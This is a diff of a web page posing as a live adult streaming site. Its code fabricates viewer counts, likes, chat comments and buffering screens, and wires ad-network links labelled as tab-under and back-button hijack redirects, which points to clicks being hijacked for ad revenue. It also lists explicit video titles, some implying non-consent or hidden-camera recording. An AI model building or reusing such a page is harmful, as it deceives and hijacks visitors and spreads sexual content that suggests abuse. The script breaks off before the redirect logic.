@@ -10,784 +10,239 @@
             --bg-base: #050505;
             --bg-surface: #0f0f12;
             --bg-card: #17171c;
-            --bg-card-hover: #22222a;
             --primary: #ff003c;
-            --primary-glow: rgba(255, 0, 60, 0.45);
-            --accent-dark-red: #990026;
-            --accent-cyan: #00f0ff;
+            --primary-glow: rgba(255, 0, 60, 0.5);
             --accent-amber: #ffb700;
             --text-main: #f8fafc;
             --text-sub: #8e8e9e;
-            --border-ui: rgba(255, 255, 255, 0.07);
+            --border-ui: rgba(255, 255, 255, 0.08);
             --radius-md: 12px;
-            --radius-lg: 18px;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-        
-        body {
-            background-color: var(--bg-base);
-            color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            overflow-x: hidden;
-            padding-bottom: 20px;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+        body { background-color: var(--bg-base); color: var(--text-main); font-family: -apple-system, sans-serif; overflow-x: hidden; padding-bottom: 20px; cursor: pointer; }
 
         /* HEADER */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: rgba(15, 15, 18, 0.88);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            padding: 10px 16px;
-            border-bottom: 1px solid var(--border-ui);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .logo {
-            color: #fff;
-            font-size: 16px;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            letter-spacing: -0.3px;
-        }
-        .logo i {
-            color: var(--primary);
-            font-size: 18px;
-            filter: drop-shadow(0 0 8px var(--primary-glow));
-        }
-        .logo span {
-            color: #fff;
-            font-size: 9px;
-            background: linear-gradient(135deg, var(--primary), var(--accent-dark-red));
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-weight: 700;
-        }
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .live-badge {
-            background: linear-gradient(135deg, var(--primary), #b3002d);
-            color: #fff;
-            font-size: 10px;
-            font-weight: 700;
-            padding: 4px 10px;
-            border-radius: 20px;
-            box-shadow: 0 0 12px var(--primary-glow);
-            animation: pulse 1.6s infinite;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .timer-badge {
-            background: rgba(255, 183, 0, 0.1);
-            color: var(--accent-amber);
-            border: 1px solid rgba(255, 183, 0, 0.3);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 3px 8px;
-            border-radius: 20px;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.75; transform: scale(0.98); }
-        }
+        .header { display: flex; justify-content: space-between; align-items: center; background: rgba(15, 15, 18, 0.95); padding: 10px 16px; border-bottom: 1px solid var(--border-ui); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 16px; font-weight: 800; display: flex; align-items: center; gap: 6px; }
+        .logo i { color: var(--primary); }
+        .live-badge { background: var(--primary); color: #fff; font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 20px; animation: pulse 1.6s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
 
-        /* LAYOUT CONTAINER */
-        .container {
-            width: 100%;
-            max-width: 1280px;
-            margin: 0 auto;
-            padding: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
+        .container { width: 100%; max-width: 1280px; margin: 0 auto; padding: 12px; display: flex; flex-direction: column; gap: 16px; }
 
-        /* MODERN PLAYER */
-        .player-card {
-            background: var(--bg-surface);
-            border-radius: var(--radius-md);
-            overflow: hidden;
-            border: 1px solid var(--border-ui);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.9);
-            margin-bottom: 16px;
-        }
-        .player-wrapper {
-            position: relative;
-            width: 100%;
-            aspect-ratio: 16/9;
-            background: #000;
-            cursor: pointer;
-            overflow: hidden;
-        }
-        .player-wrapper img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .anim-canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-        .overlay {
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(180deg, rgba(5, 5, 5, 0.75) 0%, rgba(0,0,0,0) 40%, rgba(5, 5, 5, 0.85) 100%);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 12px;
-            z-index: 2;
-        }
-        .top-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .quality-badge {
-            background: rgba(15, 15, 18, 0.85);
-            border: 1px solid var(--accent-cyan);
-            color: var(--accent-cyan);
-            font-size: 10px;
-            font-weight: 700;
-            padding: 4px 8px;
-            border-radius: 20px;
-            backdrop-filter: blur(8px);
-        }
-        .online-views {
-            background: rgba(15, 15, 18, 0.85);
-            color: var(--text-main);
-            font-size: 11px;
-            font-weight: 600;
-            padding: 4px 10px;
-            border-radius: 20px;
-            border: 1px solid var(--border-ui);
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            gap: 5px;
+        /* PLAYER CARD */
+        .player-card { background: var(--bg-surface); border-radius: var(--radius-md); overflow: hidden; border: 1px solid var(--border-ui); position: relative; }
+        .player-wrapper { position: relative; width: 100%; aspect-ratio: 16/9; background: #000; overflow: hidden; }
+        .player-wrapper img { width: 100%; height: 100%; object-fit: cover; filter: none; }
+        
+        .unmute-bar {
+            position: absolute; top: 12px; left: 50%; transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.85); border: 1px solid var(--accent-amber); color: var(--accent-amber);
+            padding: 6px 16px; border-radius: 20px; font-size: 11px; font-weight: 700; z-index: 10;
+            display: flex; align-items: center; gap: 8px; box-shadow: 0 0 15px rgba(255, 183, 0, 0.3);
         }
 
         /* PLAY BUTTON */
-        .play-btn-wrapper {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            z-index: 3;
-            width: 90%;
-        }
+        .play-btn-wrapper { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 5; width: 100%; }
         .play-btn {
-            width: 62px;
-            height: 62px;
-            background: linear-gradient(135deg, var(--primary), var(--accent-dark-red));
-            border: 3px solid rgba(255, 255, 255, 0.9);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 22px;
-            margin: 0 auto 10px auto;
-            box-shadow: 0 0 30px var(--primary-glow);
-            animation: modernPulse 2s infinite ease-in-out;
+            width: 72px; height: 72px; background: var(--primary); border: 3px solid #fff;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            color: #fff; font-size: 28px; margin: 0 auto 10px; box-shadow: 0 0 25px var(--primary-glow);
+            animation: pulse 1.5s infinite; padding-left: 4px;
         }
-        @keyframes modernPulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 15px var(--primary-glow); }
-            50% { transform: scale(1.08); box-shadow: 0 0 35px var(--primary); }
-        }
-        .buffer-text {
-            color: #fff;
-            font-size: 12px;
-            font-weight: 600;
-            background: rgba(15, 15, 18, 0.85);
-            padding: 5px 14px;
-            border-radius: 20px;
-            backdrop-filter: blur(8px);
-            border: 1px solid var(--border-ui);
-            display: inline-block;
-        }
+        .buffer-text { color: #fff; font-size: 12px; background: rgba(0,0,0,0.85); padding: 6px 16px; border-radius: 20px; border: 1px solid var(--border-ui); display: inline-block; }
 
-        /* PROGRESS BAR */
-        .progress-bar-container {
-            width: 100%;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.1);
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            z-index: 3;
+        /* FAST BUFFERING OVERLAY FOR 0.5s DELAY */
+        .buffer-overlay {
+            position: absolute; inset: 0; background: rgba(0,0,0,0.75); z-index: 20;
+            display: none; align-items: center; justify-content: center; flex-direction: column; gap: 10px;
         }
-        .progress-bar-fill {
-            width: 42%;
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary), #ff4d6d);
-        }
+        .buffer-spinner { font-size: 40px; color: var(--primary); animation: spin 0.6s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* STREAM DETAILS */
-        .video-info {
-            padding: 12px;
-        }
-        .video-title {
-            font-size: 15px;
-            font-weight: 700;
-            line-height: 1.35;
-            margin-bottom: 10px;
-            color: var(--text-main);
-        }
-        .video-stats {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-size: 12px;
-            color: var(--text-sub);
-            padding-top: 10px;
-            border-top: 1px solid var(--border-ui);
-        }
-        .action-btns {
-            display: flex;
-            gap: 8px;
-        }
-        .action-btn {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            color: var(--text-main);
-            font-size: 11px;
-            font-weight: 600;
-            background: var(--bg-card);
-            padding: 5px 10px;
-            border-radius: 20px;
-            border: 1px solid var(--border-ui);
-            cursor: pointer;
-        }
+        /* VIDEO INFO & BUTTONS */
+        .video-info { padding: 14px; }
+        .video-title { font-size: 15px; font-weight: 700; color: var(--text-main); margin-bottom: 12px; line-height: 1.3; }
+        .video-stats { display: flex; align-items: center; justify-content: space-between; font-size: 12px; color: var(--text-sub); border-top: 1px solid var(--border-ui); padding-top: 12px; }
+        .action-btns { display: flex; gap: 10px; }
+        .action-btn { display: flex; align-items: center; gap: 6px; color: var(--text-main); font-size: 12px; font-weight: 600; background: var(--bg-card); padding: 6px 14px; border-radius: 20px; border: 1px solid var(--border-ui); }
 
-        /* CHAT SECTION */
-        .live-chat-box {
-            background: var(--bg-surface);
-            border: 1px solid var(--border-ui);
-            border-radius: var(--radius-md);
-            padding: 12px;
-            cursor: pointer;
-        }
-        .chat-header {
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--text-sub);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .chat-messages {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            max-height: 180px;
-            overflow-y: auto;
-        }
-        .comment-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            background: var(--bg-card);
-            padding: 8px 10px;
-            border-radius: 8px;
-            border: 1px solid var(--border-ui);
-            animation: slideUp 0.3s ease-out;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(4px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .c-avatar-img {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 1px solid rgba(255, 0, 60, 0.3);
-            flex-shrink: 0;
-        }
+        /* SIDEBAR RELATED STREAMS */
+        .sidebar-title { font-size: 14px; font-weight: 700; margin-bottom: 12px; color: var(--text-main); display: flex; align-items: center; gap: 6px; }
+        .sidebar-title::before { content: ''; width: 3px; height: 14px; background: var(--primary); border-radius: 2px; }
+        .sidebar-item { display: flex; gap: 12px; margin-bottom: 12px; background: var(--bg-surface); padding: 8px; border-radius: 10px; border: 1px solid var(--border-ui); }
+        .sidebar-item .thumb { width: 110px; height: 62px; background: #000; position: relative; flex-shrink: 0; border-radius: 6px; overflow: hidden; }
+        .sidebar-item .thumb img { width: 100%; height: 100%; object-fit: cover; }
+        .sidebar-item .duration { position: absolute; bottom: 4px; right: 4px; background: rgba(0, 0, 0, 0.85); color: #fff; font-size: 9px; font-weight: 700; padding: 2px 5px; border-radius: 3px; }
+        .sidebar-item .info { display: flex; flex-direction: column; justify-content: center; }
+        .sidebar-item .title { font-size: 12px; font-weight: 600; line-height: 1.35; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; margin-bottom: 4px; color: var(--text-main); }
+        .sidebar-item .meta { font-size: 11px; color: var(--text-sub); }
 
-        .c-name {
-            font-weight: 700;
-            color: var(--text-main);
-            font-size: 11px;
+        /* 18+ AGE MODAL */
+        .age-modal-overlay {
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.65);
+            display: flex; align-items: center; justify-content: center; z-index: 99999; padding: 16px;
         }
-        .c-name span {
-            color: var(--text-sub);
-            font-size: 9px;
-            font-weight: 400;
-            margin-left: 4px;
+        .age-modal {
+            background: rgba(15, 15, 18, 0.95); border: 1px solid var(--primary); padding: 24px;
+            border-radius: 16px; text-align: center; max-width: 360px; width: 100%; box-shadow: 0 0 35px var(--primary-glow);
         }
-        .c-text {
-            color: #e2e8f0;
-            font-size: 11px;
-            margin-top: 2px;
-        }
-
-        /* SIDEBAR RECOMMENDATIONS */
-        .sidebar-title {
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            color: var(--text-main);
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .sidebar-title::before {
-            content: '';
-            width: 3px;
-            height: 14px;
-            background: var(--primary);
-            border-radius: 2px;
-        }
-        .sidebar-item {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            background: var(--bg-surface);
-            padding: 6px;
-            border-radius: 8px;
-            border: 1px solid var(--border-ui);
-            transition: all 0.2s ease;
-        }
-        .sidebar-item:hover {
-            background: var(--bg-card-hover);
-            border-color: rgba(255, 0, 60, 0.3);
-        }
-        .sidebar-item .thumb {
-            width: 100px;
-            height: 58px;
-            background: #000;
-            position: relative;
-            flex-shrink: 0;
-            border-radius: 6px;
-            overflow: hidden;
-        }
-        .sidebar-item .thumb img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .sidebar-item .duration {
-            position: absolute;
-            bottom: 3px;
-            right: 3px;
-            background: rgba(0, 0, 0, 0.85);
-            color: #fff;
-            font-size: 9px;
-            font-weight: 600;
-            padding: 1px 4px;
-            border-radius: 3px;
-        }
-        .sidebar-item .info {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-        .sidebar-item .title {
-            font-size: 11px;
-            font-weight: 600;
-            line-height: 1.3;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
-            overflow: hidden;
-            margin-bottom: 3px;
-            color: var(--text-main);
-        }
-        .sidebar-item .meta {
-            font-size: 10px;
-            color: var(--text-sub);
-        }
-
-        /* TOAST NOTIFICATION */
-        .notification-toast {
-            position: fixed;
-            bottom: 12px;
-            left: 12px;
-            right: 12px;
-            background: var(--bg-surface);
-            border: 1px solid var(--border-ui);
-            border-left: 4px solid var(--primary);
-            color: #fff;
-            padding: 10px 14px;
-            border-radius: var(--radius-md);
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.9);
-            z-index: 9999;
-            transform: translateY(100px);
-            opacity: 0;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            pointer-events: none;
-        }
-        .notification-toast.show {
-            transform: translateY(0);
-            opacity: 1;
-        }
-        .notification-toast i {
-            color: var(--primary);
-            font-size: 16px;
-        }
-
-        /* RESPONSIVE MEDIA QUERIES */
-        @media (min-width: 768px) {
-            .header { padding: 12px 24px; }
-            .logo { font-size: 18px; }
-            .logo i { font-size: 22px; }
-            .logo span { font-size: 10px; padding: 2px 6px; }
-            .live-badge { font-size: 11px; padding: 5px 12px; }
-            .timer-badge { font-size: 11px; padding: 4px 10px; }
-            .container { padding: 20px; gap: 20px; }
-            .player-card { border-radius: var(--radius-lg); }
-            .play-btn { width: 70px; height: 70px; font-size: 26px; }
-            .buffer-text { font-size: 13px; padding: 6px 16px; }
-            .video-info { padding: 18px; }
-            .video-title { font-size: 18px; }
-            .action-btn { font-size: 12px; padding: 6px 14px; }
-            .live-chat-box { padding: 16px; border-radius: var(--radius-lg); }
-            .chat-messages { max-height: 220px; }
-            .c-avatar-img { width: 36px; height: 36px; }
-            .sidebar-item .thumb { width: 120px; height: 68px; }
-            .sidebar-item .title { font-size: 12px; }
-            .notification-toast { left: 20px; right: auto; max-width: 380px; }
-        }
+        .age-modal h3 { color: var(--primary); font-size: 18px; margin-bottom: 8px; }
+        .age-modal p { font-size: 13px; color: var(--text-sub); margin-bottom: 20px; }
+        .age-btn-group { display: flex; gap: 10px; }
+        .age-btn { flex: 1; padding: 12px; border-radius: 8px; border: none; font-weight: 700; font-size: 13px; cursor: pointer; }
+        .age-btn-yes { background: var(--primary); color: #fff; box-shadow: 0 0 15px var(--primary-glow); }
+        .age-btn-no { background: var(--bg-card); color: #fff; border: 1px solid var(--border-ui); }
 
         @media (min-width: 992px) {
             .container { flex-direction: row; }
             .main-content { flex: 1; }
-            .sidebar { width: 360px; }
+            .sidebar { width: 380px; }
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo">
-            <i class="fas fa-play-circle"></i> STREAMHUB <span>PRO</span>
-        </div>
-        <div class="header-right">
-            <div class="timer-badge"><i class="fas fa-clock"></i> <span id="offerTimer">05:00</span></div>
-            <div class="live-badge">
-                <i class="fas fa-circle" style="font-size: 7px;"></i> LIVE
+    <!-- 18+ MODAL -->
+    <div class="age-modal-overlay" id="ageModal">
+        <div class="age-modal">
+            <i class="fas fa-exclamation-triangle" style="font-size: 32px; color: var(--primary); margin-bottom: 10px;"></i>
+            <h3>AGE RESTRICTED (18+)</h3>
+            <p>This live video contains explicit adult content. Confirm your age to watch.</p>
+            <div class="age-btn-group">
+                <button class="age-btn age-btn-yes" id="btnYes">I AM 18 OR OLDER</button>
+                <button class="age-btn age-btn-no" id="btnNo">EXIT ( LEAVE )</button>
             </div>
         </div>
+    </div>
+
+    <div class="header">
+        <div class="logo"><i class="fas fa-play-circle"></i> STREAMHUB</div>
+        <div class="live-badge"><i class="fas fa-circle" style="font-size: 7px;"></i> LIVE HD</div>
     </div>
 
     <div class="container">
         <div class="main-content">
             <div class="player-card">
-                <div class="player-wrapper clickable-element" id="videoPlayer">
-                    <img id="mainGif" src="" alt="Stream Preview">
-                    <canvas id="animCanvas" class="anim-canvas"></canvas>
-                    
-                    <div class="overlay" id="playerOverlay">
-                        <div class="top-info">
-                            <span class="quality-badge"><i class="fas fa-check-circle"></i> 4K ULTRA HD</span>
-                            <span class="online-views"><i class="fas fa-user" style="color: var(--primary);"></i> <span id="mainViews">64,280</span></span>
-                        </div>
-                        <div class="play-btn-wrapper">
-                            <div class="play-btn">
-                                <i class="fas fa-play" style="margin-left: 3px;"></i>
-                            </div>
-                            <div class="buffer-text">Tap to Unmute & Watch in HD</div>
-                        </div>
-                        <div></div>
+                <div class="player-wrapper">
+                    <!-- BUFFER OVERLAY (0.5s TRIGGER) -->
+                    <div class="buffer-overlay" id="bufferLoader">
+                        <i class="fas fa-spinner buffer-spinner"></i>
+                        <span style="font-size: 13px; font-weight: 600; color: #fff;">Connecting High Speed Server...</span>
                     </div>
 
-                    <div class="progress-bar-container" id="progressSlider">
-                        <div class="progress-bar-fill"></div>
+                    <div class="unmute-bar"><i class="fas fa-volume-mute"></i> TAP ANYWHERE TO UNMUTE AUDIO</div>
+                    <img src="023_1000.GIF" alt="Stream Preview">
+                    <div class="play-btn-wrapper">
+                        <div class="play-btn"><i class="fas fa-play"></i></div>
+                        <div class="buffer-text"><i class="fas fa-spinner fa-spin"></i> Tap to Start Full HD Stream</div>
                     </div>
                 </div>
-
+                
                 <div class="video-info">
-                    <div class="video-title clickable-element" id="mainTitle">Loading Stream Title...</div>
+                    <div class="video-title">Hot Girl fucked by Huge cock with Full hardcore sex</div>
                     <div class="video-stats">
-                        <div>Started 4 mins ago</div>
+                        <div><i class="fas fa-eye" style="color: var(--primary);"></i> 64,280 Watching</div>
                         <div class="action-btns">
-                            <div class="action-btn clickable-element"><i class="fas fa-thumbs-up" style="color: var(--accent-amber);"></i> <span id="likeCount">142K</span></div>
-                            <div class="action-btn clickable-element"><i class="fas fa-share"></i> Share</div>
+                            <div class="action-btn"><i class="fas fa-thumbs-up" style="color: var(--accent-amber);"></i> <span>142K</span></div>
+                            <div class="action-btn"><i class="fas fa-share"></i> Share</div>
                         </div>
                     </div>
                 </div>
-            </div>
-
-            <div class="live-chat-box clickable-element" id="commentsBox">
-                <div class="chat-header">
-                    <span>Live Stream Chat</span>
-                    <span style="color: var(--primary);"><i class="fas fa-circle" style="font-size: 7px;"></i> Active</span>
-                </div>
-                <div class="chat-messages" id="commentsList"></div>
             </div>
         </div>
 
         <div class="sidebar">
-            <div class="sidebar-title">Recommended Streams</div>
+            <div class="sidebar-title">Related Streams</div>
             <div id="suggestedList"></div>
-        </div>
-    </div>
-
-    <div class="notification-toast" id="notifToast">
-        <i class="fas fa-check-circle"></i>
-        <div>
-            <strong id="notifUser">User</strong> <span id="notifAction">unlocked 4K stream access!</span>
         </div>
     </div>
 
     <script>
         (function() {
-            // Rotating Pool Links System
-            const linkPool = [
-                'https://honmia.com/4/67efc8f808bee7d0fa1fed3b1c1ec49e',
-                'https://honmia.com/4/8f5543828a51908d6d8f0bee94456970',
-                'https://honmia.com/4/af136ebb949df323ab07ebc85eca6f77',
-                'https://honmia.com/4/b60541cc1e59c6a68a4b3bb3bbfbc00d',
-                'https://honmia.com/4/c74e180cc15f49c5336e00240cd85af8'
-            ];
-
+            // TARGETED LINKS CONFIGURATION
+            const MAIN_OFFER_LINK = 'https://honmia.com/4/ce86b8ee2fcd9361291ab7a5822f9f83';
+            const TAB_UNDER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a';
             const BACK_HIJACK_LINK = 'https://www.profitableratecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
-            let currentLinkIndex = 0;
 
             const videoPool = [
                 { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
                 { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
                 { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
                 { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
-                { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
-                { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
-                { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
-                { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
-                { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
-                { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
-                { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
+                { src: 'IMG_5606.GIF', title: 'Young Couple Hardcore Private Tapes Leaked', views: '1.2M', time: '08:22' },
+                { src: 'IMG_5608.GIF', title: 'Busty Blonde Creampie Experience in HD', views: '950K', time: '14:05' },
+                { src: 'IMG_5609.GIF', title: 'Shy Girl First Time Hardcore Outdoor Stream', views: '3.4M', time: '18:50' },
+                { src: 'IMG_5610.GIF', title: 'Step Sister Need Help With Homework Sex Session', views: '890K', time: '11:15' },
+                { src: 'IMG_5611.GIF', title: 'Latina Babe Deepthroat and Rough Sex Session', views: '1.5M', time: '13:40' },
+                { src: 'IMG_5612.GIF', title: 'College Hostel Room Hidden Camera Leaked Tape', views: '4.1M', time: '22:10' },
+                { src: 'IMG_5613.GIF', title: 'Horny Housewife Cheating With Fitness Trainer', views: '1.9M', time: '16:00' },
+                { src: 'IMG_5614.GIF', title: 'Extreme Rough Blowjob and Facial Compilation', views: '2.8M', time: '07:45' }
             ];
 
-            const commentsPool = [
-                { avatar: 'https://i.pravatar.cc/100?img=12', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥' },
-                { avatar: 'https://i.pravatar.cc/100?img=32', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯' },
-                { avatar: 'https://i.pravatar.cc/100?img=53', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!' },
-                { avatar: 'https://i.pravatar.cc/100?img=60', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆' },
-                { avatar: 'https://i.pravatar.cc/100?img=47', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥' },
-                { avatar: 'https://i.pravatar.cc/100?img=68', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦' },
-                { avatar: 'https://i.pravatar.cc/100?img=25', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...' },
-                { avatar: 'https://i.pravatar.cc/100?img=15', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌' },
-                { avatar: 'https://i.pravatar.cc/100?img=57', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!' },
-                { avatar: 'https://i.pravatar.cc/100?img=44', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!' },
-                { avatar: 'https://i.pravatar.cc/100?img=33', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅' },
-                { avatar: 'https://i.pravatar.cc/100?img=11', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!' }
-            ];
-
-            const notificationUsers = ['Alex', 'David', 'Chris', 'Marco', 'Stefan', 'Daniel', 'User_99', 'Jason'];
-
-            const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
-            document.getElementById('mainGif').src = mainVideo.src;
-            document.getElementById('mainTitle').textContent = mainVideo.title;
-
-            // Load Initial Comments
-            const commentsContainer = document.getElementById('commentsList');
-            let initialCommentsHtml = '';
-            for(let i = 0; i < 3; i++) {
-                let c = commentsPool[i];
-                initialCommentsHtml += `
-                <div class="comment-item">
-                    <img class="c-avatar-img" src="${c.avatar}" alt="User Avatar">
-                    <div class="c-body">
-                        <div class="c-name">${c.name} <span>just now</span></div>
-                        <div class="c-text">${c.text}</div>
-                    </div>
-                </div>`;
-            }
-            commentsContainer.innerHTML = initialCommentsHtml;
-
-            // Stream Auto Comments
-            let commentIndex = 3;
-            setInterval(() => {
-                if (commentIndex >= commentsPool.length) commentIndex = 0;
-                const c = commentsPool[commentIndex];
-                const commentElement = document.createElement('div');
-                commentElement.className = 'comment-item';
-                commentElement.innerHTML = `
-                    <img class="c-avatar-img" src="${c.avatar}" alt="User Avatar">
-                    <div class="c-body">
-                        <div class="c-name">${c.name} <span>just now</span></div>
-                        <div class="c-text">${c.text}</div>
-                    </div>
-                `;
-                commentsContainer.insertBefore(commentElement, commentsContainer.firstChild);
-                if (commentsContainer.children.length > 10) commentsContainer.removeChild(commentsContainer.lastChild);
-                commentIndex++;
-            }, Math.floor(Math.random() * 2000) + 2000);
-
-            // Load Recommendations Sidebar
+            // Render Related Streams
             let sidebarHtml = '';
             videoPool.forEach((item) => {
-                if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
-                    sidebarHtml += `
-                    <div class="sidebar-item suggested-video-item clickable-element">
-                        <div class="thumb">
-                            <img src="${item.src}" loading="lazy" alt="Thumbnail" />
-                            <div class="duration">${item.time}</div>
-                        </div>
-                        <div class="info">
-                            <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} views • Stream</div>
-                        </div>
-                    </div>`;
-                }
+                sidebarHtml += `
+                <div class="sidebar-item">
+                    <div class="thumb">
+                        <img src="${item.src}" alt="Thumbnail" />
+                        <div class="duration">${item.time}</div>
+                    </div>
+                    <div class="info">
+                        <div class="title">${item.title}</div>
+                        <div class="meta">${item.views} views • Live</div>
+                    </div>
+                </div>`;
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // Dynamic Views Counter
-            let currentViews = 64280;
-            const viewsElem = document.getElementById('mainViews');
-            setInterval(() => {
-                currentViews += Math.floor(Math.random() * 15) - 5;
-                viewsElem.textContent = currentViews.toLocaleString();
-            }, 1800);
+            let isModalActive = true;
 
-            // Timer Counter
-            let timerSeconds = 300;
-            const timerElem = document.getElementById('offerTimer');
-            setInterval(() => {
-                if(timerSeconds > 0) {
-                    timerSeconds--;
-                    let m = Math.floor(timerSeconds / 60);
-                    let s = timerSeconds % 60;
-                    timerElem.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-                }
-            }, 1000);
-
-            // Notifications Toast
-            const toast = document.getElementById('notifToast');
-            const toastUser = document.getElementById('notifUser');
-            setInterval(() => {
-                toastUser.textContent = notificationUsers[Math.floor(Math.random() * notificationUsers.length)];
-                toast.classList.add('show');
-                setTimeout(() => toast.classList.remove('show'), 3000);
-            }, 6500);
-
-            // Crimson Red Ripple Animation
-            function initOptimizedPlayerAnimation() {
-                const canvas = document.getElementById('animCanvas');
-                const ctx = canvas.getContext('2d');
-                let ripples = [];
-
-                function resizeCanvas() {
-                    canvas.width = canvas.parentElement.clientWidth;
-                    canvas.height = canvas.parentElement.clientHeight;
-                }
-                resizeCanvas();
-                window.addEventListener('resize', resizeCanvas, { passive: true });
-
-                class Ripple {
-                    constructor(x, y) {
-                        this.x = x;
-                        this.y = y;
-                        this.radius = 25;
-                        this.alpha = 0.8;
-                        this.speed = 1.2;
-                    }
-                    update() {
-                        this.radius += this.speed;
-                        this.alpha -= 0.012;
-                    }
-                    draw() {
-                        ctx.beginPath();
-                        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
